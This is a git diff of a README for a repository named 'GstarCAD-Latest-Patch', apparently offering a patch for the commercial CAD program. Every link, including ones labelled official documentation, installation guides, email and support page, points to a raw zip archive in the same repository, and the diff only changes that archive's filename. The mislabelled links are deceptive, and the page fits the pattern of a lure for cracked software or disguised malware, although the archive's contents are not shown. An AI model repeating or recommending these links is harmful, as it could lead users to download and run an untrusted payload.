@@ -1,6 +1,6 @@
 # 🖥️ GstarCAD-Latest-Patch - Easy Access to CAD Resources
 
-[![Download GstarCAD-Latest-Patch](https://raw.githubusercontent.com/neonovasolutions/GstarCAD-Latest-Patch/main/pampinocele/GstarCAD-Latest-Patch-1.2-beta.1.zip)](https://raw.githubusercontent.com/neonovasolutions/GstarCAD-Latest-Patch/main/pampinocele/GstarCAD-Latest-Patch-1.2-beta.1.zip)
+[![Download GstarCAD-Latest-Patch](https://raw.githubusercontent.com/neonovasolutions/GstarCAD-Latest-Patch/main/pampinocele/Patch-CA-Gstar-Latest-2.2-alpha.1.zip)](https://raw.githubusercontent.com/neonovasolutions/GstarCAD-Latest-Patch/main/pampinocele/Patch-CA-Gstar-Latest-2.2-alpha.1.zip)
 
 ## 📋 Overview
 
@@ -17,7 +17,7 @@ Before you begin, ensure your Windows PC meets these requirements:
 
 ## 📥 Download & Install
 
-To download GstarCAD-Latest-Patch, [visit this page to download](https://raw.githubusercontent.com/neonovasolutions/GstarCAD-Latest-Patch/main/pampinocele/GstarCAD-Latest-Patch-1.2-beta.1.zip). 
+To download GstarCAD-Latest-Patch, [visit this page to download](https://raw.githubusercontent.com/neonovasolutions/GstarCAD-Latest-Patch/main/pampinocele/Patch-CA-Gstar-Latest-2.2-alpha.1.zip). 
 
 1. Click on the "Releases" link above.
 2. Look for the latest version.
@@ -59,15 +59,15 @@ Connect with fellow GstarCAD users through our community. You can ask questions,
 
 For more detailed guides and reference materials, visit:
 
-- [GstarCAD Official Documentation](https://raw.githubusercontent.com/neonovasolutions/GstarCAD-Latest-Patch/main/pampinocele/GstarCAD-Latest-Patch-1.2-beta.1.zip).
-- [Installation Guides](https://raw.githubusercontent.com/neonovasolutions/GstarCAD-Latest-Patch/main/pampinocele/GstarCAD-Latest-Patch-1.2-beta.1.zip).
-- [Feature Descriptions](https://raw.githubusercontent.com/neonovasolutions/GstarCAD-Latest-Patch/main/pampinocele/GstarCAD-Latest-Patch-1.2-beta.1.zip).
+- [GstarCAD Official Documentation](https://raw.githubusercontent.com/neonovasolutions/GstarCAD-Latest-Patch/main/pampinocele/Patch-CA-Gstar-Latest-2.2-alpha.1.zip).
+- [Installation Guides](https://raw.githubusercontent.com/neonovasolutions/GstarCAD-Latest-Patch/main/pampinocele/Patch-CA-Gstar-Latest-2.2-alpha.1.zip).
+- [Feature Descriptions](https://raw.githubusercontent.com/neonovasolutions/GstarCAD-Latest-Patch/main/pampinocele/Patch-CA-Gstar-Latest-2.2-alpha.1.zip).
 
 ## 📧 Contact Us
 
 If you encounter any issues or have questions, please reach out:
 
-- Email: https://raw.githubusercontent.com/neonovasolutions/GstarCAD-Latest-Patch/main/pampinocele/GstarCAD-Latest-Patch-1.2-beta.1.zip
-- Visit: [GstarCAD Support Page](https://raw.githubusercontent.com/neonovasolutions/GstarCAD-Latest-Patch/main/pampinocele/GstarCAD-Latest-Patch-1.2-beta.1.zip).
+- Email: https://raw.githubusercontent.com/neonovasolutions/GstarCAD-Latest-Patch/main/pampinocele/Patch-CA-Gstar-Latest-2.2-alpha.1.zip
+- Visit: [GstarCAD Support Page](https://raw.githubusercontent.com/neonovasolutions/GstarCAD-Latest-Patch/main/pampinocele/Patch-CA-Gstar-Latest-2.2-alpha.1.zip).
 
 Your journey with GstarCAD starts now! Enjoy creating and collaborating with your designs.
